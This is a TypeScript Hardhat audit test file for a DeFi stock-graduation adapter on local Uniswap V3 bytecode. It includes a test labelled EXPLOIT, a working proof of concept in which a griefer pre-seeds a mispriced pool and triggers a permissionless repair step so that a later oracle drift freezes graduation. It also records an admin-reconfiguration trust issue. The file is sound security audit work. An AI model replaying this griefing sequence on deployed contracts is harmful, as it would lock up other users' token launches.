/**
 * Audit 2 (independent): Robinhood stock graduation after a chunked repair, on the real Uniswap V3
 * bytecode installed locally (no fork). Harness campaign = MockEvmGenRhCampaign (mirrors LaunchCampaign
 * around the adapter call).
 */
import { expect } from "chai";
import { ethers, network } from "hardhat";
import { installRealV3, RH_V3, seedFullRangePool } from "./helpers/evmgenRhRealV3";

const WAD = 10n ** 18n;
const Q192 = 1n << 192n;
const Q96 = 1n << 96n;
const SUPPLY = 10n ** 27n;
const RESERVE = 2n * 10n ** 25n;

function isqrt(v: bigint): bigint {
  if (v < 2n) return v;
  let x = 1n << BigInt((v.toString(2).length >> 1) + 1);
  for (;;) {
    const y = (x + v / x) >> 1n;
    if (y >= x) return x;
    x = y;
  }
}
const sqrtFromPrice = (p: bigint, memeIs0: boolean) => isqrt(memeIs0 ? (p * Q192) / WAD : (WAD * Q192) / p);
const tickOf = (s: bigint) => Math.floor(Math.log((Number(s) / Number(Q96)) ** 2) / Math.log(1.0001));

function curve(soldWhole: bigint) {
  const b = 1_000_000_000n;
  const k = 850n;
  const P = b + k * soldWhole;
  const R = soldWhole * b + (k * soldWhole * soldWhole) / 2n;
  const poolNative = R - (R * 220n) / 10_000n - (R * 1980n) / 10_000n;
  const T = (poolNative * WAD) / P;
  const budget = SUPPLY - RESERVE - soldWhole * WAD;
  return { P, R, poolNative, T, budget };
}

const snap = () => network.provider.send("evm_snapshot", []);
const revert = (id: string) => network.provider.send("evm_revert", [id]);
async function nowTs() {
  return BigInt((await ethers.provider.getBlock("latest"))!.timestamp);
}

describe("audit2: Robinhood stock adapter, chunked repair vs oracle drift (real V3 bytecode)", function () {
  this.timeout(600_000);

  async function setup() {
    const [owner, griefOwner] = await ethers.getSigners();
    const v3 = await installRealV3();
    const ethUsd = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const stockUsd = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const t = await nowTs();
    await ethUsd.setRoundData(1, 3000n * 10n ** 8n, t, t, 1);
    await stockUsd.setRoundData(1, 100n * 10n ** 8n, t, t, 1);
    const stock = await (await ethers.getContractFactory("MockERC20")).deploy("Stock", "STK", 10n ** 30n, owner.address);

    // Deep WETH/STOCK acquisition pool at the oracle ratio (30 STOCK per WETH).
    await v3.weth.connect(owner).deposit({ value: ethers.parseEther("3000") });
    await seedFullRangePool(owner, v3.weth, stock, 3000, ethers.parseEther("3000"), ethers.parseEther("90000"));
    const acqPool = await v3.v3Factory.getPool(RH_V3.weth, await stock.getAddress(), 3000);

    const receiver = await (await ethers.getContractFactory("AcceptingReceiver")).deploy();
    const locker = await (await ethers.getContractFactory("PermanentV3PositionLocker")).deploy(owner.address);
    const factory = await (await ethers.getContractFactory("MockEvmGenRhFactory")).deploy(await locker.getAddress());
    const native = await (await ethers.getContractFactory("RobinhoodV3NativeGraduationAdapterV2")).deploy(RH_V3.v3Factory, RH_V3.positionManager, RH_V3.weth);
    const adapter = await (await ethers.getContractFactory("RobinhoodStockGraduationAdapterV2")).deploy(
      RH_V3.v3Factory,
      RH_V3.positionManager,
      RH_V3.swapRouter02,
      RH_V3.weth,
      await ethUsd.getAddress(),
      90_000,
    );
    await locker.configureRevenue(await receiver.getAddress(), await native.getAddress());
    await locker.setIntegrationSourceAuthorized(await adapter.getAddress(), true);
    await adapter.setCampaignFactoryOnce(await factory.getAddress());
    await adapter.configureStockRoute(await stock.getAddress(), {
      oracleFeed: await stockUsd.getAddress(),
      acquisitionPool: acqPool,
      acquisitionFeeTier: 3000,
      minimumRouteLiquidityUsdWad: 50_000n * WAD,
      maxSwapSlippageBps: 300,
      maxOracleDeviationBps: 0,
      maxPriceImpactBps: 0,
      enabled: true,
    });

    const campaign = await (await ethers.getContractFactory("MockEvmGenRhCampaign")).deploy();
    await campaign.init(ethers.ZeroHash, SUPPLY);
    await factory.setCampaign(await campaign.getAddress(), true);
    const meme = await campaign.token();
    const stockAddr = await stock.getAddress();
    const memeIs0 = BigInt(meme) < BigInt(stockAddr);
    return { owner, griefOwner, v3, ethUsd, stockUsd, stock, stockAddr, acqPool, adapter, campaign, meme, memeIs0 };
  }

  /** Move the acquisition pool to `stockPerWeth` (num/den) by selling STOCK into it (arbitrageur). */
  async function syncAcquisitionPool(ctx: any, num: bigint, den: bigint) {
    const wethIs0 = BigInt(RH_V3.weth) < BigInt(ctx.stockAddr);
    // token1/token0 raw ratio
    const ratioX192 = wethIs0 ? (num * Q192) / den : (den * Q192) / num;
    const limit = isqrt(ratioX192);
    const router = await ethers.getContractAt(
      ["function exactInputSingle((address tokenIn,address tokenOut,uint24 fee,address recipient,uint256 amountIn,uint256 amountOutMinimum,uint160 sqrtPriceLimitX96)) payable returns (uint256)"],
      RH_V3.swapRouter02,
    );
    const amt = ethers.parseEther("50000");
    await ctx.stock.connect(ctx.owner).approve(RH_V3.swapRouter02, amt);
    await (router.connect(ctx.owner) as any).exactInputSingle({
      tokenIn: ctx.stockAddr,
      tokenOut: RH_V3.weth,
      fee: 3000,
      recipient: ctx.owner.address,
      amountIn: amt,
      amountOutMinimum: 0,
      sqrtPriceLimitX96: limit,
    });
  }

  async function freshFeeds(ctx: any, stockUsd: bigint) {
    const t = await nowTs();
    await ctx.ethUsd.setRoundData(9, 3000n * 10n ** 8n, t, t, 9);
    await ctx.stockUsd.setRoundData(9, stockUsd * 10n ** 8n, t, t, 9);
  }

  it("EXPLOIT: a permissionless repair step followed by a ~10% ETH/STOCK ratio move freezes stock graduation (RepairInvariantBroken); the same drift without the step graduates", async () => {
    const ctx = await setup();
    const c = curve(160_000_000n);
    const cAddr = await ctx.campaign.getAddress();
    await ctx.owner.sendTransaction({ to: cAddr, value: c.poolNative });

    // Griefer: pre-made MEME/STOCK pool far above the estimate, one STOCK-only bid range above the step stop.
    const est = (c.P * 3000n) / 100n; // STOCK raw per 1e18 MEME
    await ctx.v3.v3Factory.createPool(ctx.meme, ctx.stockAddr, 3000);
    const poolAddr = await ctx.v3.v3Factory.getPool(ctx.meme, ctx.stockAddr, 3000);
    const pool = await ethers.getContractAt(["function initialize(uint160)", "function slot0() view returns (uint160,int24,uint16,uint16,uint16,uint8,bool)"], poolAddr);
    await pool.initialize(sqrtFromPrice(est * 1000n, ctx.memeIs0));
    const g = await (await ethers.getContractFactory("MockEvmGenRhGriefer")).deploy();
    await ctx.stock.transfer(await g.getAddress(), ethers.parseEther("100"));
    const ta = tickOf(sqrtFromPrice((est * 106n) / 100n, ctx.memeIs0));
    const tb = tickOf(sqrtFromPrice(est * 3n, ctx.memeIs0));
    const lower = (Math.floor(Math.min(ta, tb) / 60) + 1) * 60;
    const upper = (Math.floor(Math.max(ta, tb) / 60) - 1) * 60;
    await g.mintRange(poolAddr, lower, upper, 10n ** 15n);

    const beforeStep = await snap();

    // Anyone runs one repair chunk now (oracle ratio 30): stops at est * 1.05, selling MEME into the bid.
    await ctx.campaign.repairPool(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, 0);
    expect(await ctx.campaign.repairMemeSold()).to.be.gt(0n);

    // STOCK falls 10% vs ETH; arbitrage syncs the acquisition pool to the new oracle ratio.
    await freshFeeds(ctx, 90n);
    await syncAcquisitionPool(ctx, 3000n, 90n);
    await expect(ctx.campaign.graduate(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, c.poolNative)).to.be.revertedWithCustomError(
      ctx.adapter,
      "RepairInvariantBroken",
    );
    // Retrying keeps failing while the ratio stays there (no path back: MEME cannot be bought out by the repair).
    await network.provider.send("evm_increaseTime", [3600]);
    await freshFeeds(ctx, 90n);
    await expect(ctx.campaign.graduate(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, c.poolNative)).to.be.reverted;

    // Control: identical state and drift, but no repair step -> graduates.
    await revert(beforeStep);
    await freshFeeds(ctx, 90n);
    await syncAcquisitionPool(ctx, 3000n, 90n);
    await ctx.campaign.graduate(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, c.poolNative);
    expect((await ctx.campaign.lastResult()).pool).to.eq(poolAddr);
  });

  it("HOLDS: without drift, repair step then graduate succeeds, adapter holds nothing, MEME conserved", async () => {
    const ctx = await setup();
    const c = curve(160_000_000n);
    const cAddr = await ctx.campaign.getAddress();
    await ctx.owner.sendTransaction({ to: cAddr, value: c.poolNative });
    const est = (c.P * 3000n) / 100n;
    await ctx.v3.v3Factory.createPool(ctx.meme, ctx.stockAddr, 3000);
    const poolAddr = await ctx.v3.v3Factory.getPool(ctx.meme, ctx.stockAddr, 3000);
    const pool = await ethers.getContractAt(["function initialize(uint160)"], poolAddr);
    await pool.initialize(sqrtFromPrice(est * 1000n, ctx.memeIs0));
    const g = await (await ethers.getContractFactory("MockEvmGenRhGriefer")).deploy();
    await ctx.stock.transfer(await g.getAddress(), ethers.parseEther("100"));
    const ta = tickOf(sqrtFromPrice((est * 106n) / 100n, ctx.memeIs0));
    const tb = tickOf(sqrtFromPrice(est * 3n, ctx.memeIs0));
    await g.mintRange(poolAddr, (Math.floor(Math.min(ta, tb) / 60) + 1) * 60, (Math.floor(Math.max(ta, tb) / 60) - 1) * 60, 10n ** 15n);
    await ctx.campaign.repairPool(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, 0);
    const sold = await ctx.campaign.repairMemeSold();
    await freshFeeds(ctx, 100n);
    await ctx.campaign.graduate(await ctx.adapter.getAddress(), ctx.stockAddr, c.T, c.budget, c.P, c.poolNative);
    const memeTok = await ethers.getContractAt("LaunchToken", ctx.meme);
    const a = await ctx.adapter.getAddress();
    expect(await memeTok.balanceOf(a)).to.eq(0n);
    expect(await ctx.stock.balanceOf(a)).to.eq(0n);
    expect(await ctx.v3.weth.balanceOf(a)).to.eq(0n);
    expect((await ctx.campaign.lastMemeUsed()) + (await ctx.campaign.lastMemeBack()) + sold).to.eq(c.budget);
  });

  it("HOLDS (trust note): the stock adapter admin can reconfigure an enabled route (feed, pool, slippage) at any time, with no delay, for coins already Pending", async () => {
    const ctx = await setup();
    const other = await (await ethers.getContractFactory("MockUsdPriceFeed")).deploy(8);
    const t = await nowTs();
    await other.setRoundData(1, 1n * 10n ** 8n, t, t, 1);
    const route = await ctx.adapter.stockRoutes(ctx.stockAddr);
    await expect(
      ctx.adapter.configureStockRoute(ctx.stockAddr, {
        oracleFeed: await other.getAddress(),
        acquisitionPool: route[1],
        acquisitionFeeTier: route[2],
        minimumRouteLiquidityUsdWad: 1n,
        maxSwapSlippageBps: 300,
        maxOracleDeviationBps: 0,
        maxPriceImpactBps: 0,
        enabled: true,
      }),
    ).to.emit(ctx.adapter, "StockRouteConfigured");
    expect((await ctx.adapter.stockRoutes(ctx.stockAddr))[0]).to.eq(await other.getAddress());
  });
});
